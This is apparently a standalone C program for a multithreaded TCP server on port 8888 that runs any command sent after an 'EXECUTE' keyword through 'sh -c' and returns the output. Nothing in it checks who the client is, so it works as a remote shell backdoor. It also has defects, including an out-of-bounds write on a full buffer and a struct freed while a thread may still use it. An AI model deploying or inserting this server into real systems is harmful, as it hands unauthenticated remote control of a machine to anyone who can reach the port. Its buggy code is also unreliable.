#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <netdb.h>

#define PORT 8888
#define MAX_CLIENTS 4
#define BUFFER_SIZE 1024

typedef struct {
    int sockfd;
    struct sockaddr_in addr;
    int handle;
} client_t;

void handle_new_connection(client_t *client) {
    if (client->handle != -1) {
        // already connected
        fprintf(stderr, "Already connected\n");
        return;
    }
    client->handle = rand() % 1000;
    send(client->sockfd, &client->handle, sizeof(client->handle), 0);
}

void handle_command_execution(client_t *client, char *cmd) {
    if (client->handle == -1) {
        // not connected
        fprintf(stderr, "Not connected\n");
        return;
    }

    char *args[] = {"sh", "-c", cmd, NULL};
    int status;

    int pipefd[2];
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    int pid = fork();
    if (pid < 0) {
        perror("fork");
        close(pipefd[0]);
        close(pipefd[1]);
        return;
    } else if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        execvp(args[0], args);
        perror("execvp");
        exit(EXIT_FAILURE);
    } else {
        close(pipefd[1]);
        char output[BUFFER_SIZE];
        int bytes_read = 0;
        int n;
        while ((n = read(pipefd[0], output + bytes_read, BUFFER_SIZE - bytes_read)) > 0) {
            bytes_read += n;
            if (bytes_read == BUFFER_SIZE) {
                break;
            }
        }
        close(pipefd[0]);

        if (bytes_read == 0) {
            sendto(client->sockfd, "No output from command\n", strlen("No output from command\n"), 0, (struct sockaddr *)&client->addr, sizeof(client->addr));
            return;
        } else if (bytes_read == BUFFER_SIZE) {
            sendto(client->sockfd, "Output too large to send\n", strlen("Output too large to send\n"), 0, (struct sockaddr *)&client->addr, sizeof(client->addr));
            return;
        }

        sendto(client->sockfd, output, bytes_read, 0, (struct sockaddr *)&client->addr, sizeof(client->addr));
        if (n <= 0) {
            perror("sendto");
        }
    }
}

void handle_disconnect(client_t *client) {
if (client->handle == -1) {
// not connected
fprintf(stderr, "Not connected\n");
return;
}
client->handle = -1;
send(client->sockfd, "Disconnected\n", strlen("Disconnected\n"), 0);
}

void *handle_client(void *arg) {
client_t *client = (client_t *)arg;
printf("New client connected\n");

while (1) {
    char buffer[BUFFER_SIZE];
    int n = recvfrom(client->sockfd, buffer, BUFFER_SIZE, 0, NULL, NULL);
    if (n <= 0) {
        break;
    }

    buffer[n] = '\0';

    if (strcmp(buffer, "CONNECT\n") == 0) {
        handle_new_connection(client);
    } else if (strncmp(buffer, "EXECUTE ", strlen("EXECUTE ")) == 0) {
        handle_command_execution(client, buffer + strlen("EXECUTE "));
    } else if (strcmp(buffer, "DISCONNECT\n") == 0) {
        handle_disconnect(client);
        break;
    } else {
        send(client->sockfd, "Invalid command\n", strlen("Invalid command\n"), 0);
    }
}

printf("Client disconnected\n");
close(client->sockfd);
free(client);

return NULL;
}

int main(int argc, char **argv) {
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd < 0) {
perror("socket");
exit(EXIT_FAILURE);
}
struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = INADDR_ANY,
    .sin_port = htons(PORT),
};

if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    perror("bind");
    exit(EXIT_FAILURE);
}

if (listen(sockfd, MAX_CLIENTS) < 0) {
    perror("listen");
    exit(EXIT_FAILURE);
}

while (1) {
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    int client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_sockfd < 0) {
        perror("accept");
        continue;
    }

    client_t *client = malloc(sizeof(client_t));
    client->sockfd = client_sockfd;
    client->addr = client_addr;
    client->handle = -1;

    pthread_t thread;
    if (pthread_create(&thread, NULL, handle_client, client) != 0) {
        perror("pthread_create");
        free(client);
        close(client_sockfd);
        continue;
    }

    if (pthread_detach(thread) != 0) {
        perror("pthread_detach");
        free(client);
        close(client_sockfd);
        continue;
    }
}

    close(sockfd);

    return 0;
}